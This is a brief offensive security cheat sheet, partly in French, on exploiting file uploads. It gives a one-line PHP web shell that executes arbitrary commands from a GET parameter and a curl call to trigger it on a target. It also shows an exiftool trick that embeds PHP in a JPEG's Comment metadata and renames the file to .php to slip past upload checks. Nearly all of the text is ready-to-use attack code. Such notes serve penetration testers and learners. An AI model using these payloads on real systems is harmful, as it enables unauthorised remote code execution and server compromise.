#Shells 

```php
echo '<?php system($_GET['command']);?>' > webshell.php
```

Exploitation:

```
curl http://target.com/uploads/webshell.php?command=id HTTP/1.1
```

#Exiftool 

Avec une image jpeg legitime, coller le shell est dans les données exif de l'image - en particulier sur le `Comment` pour le garder bien à l'écart.

```sh
exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" image.jpeg

mv image.jpeg image.jpeg.php
```


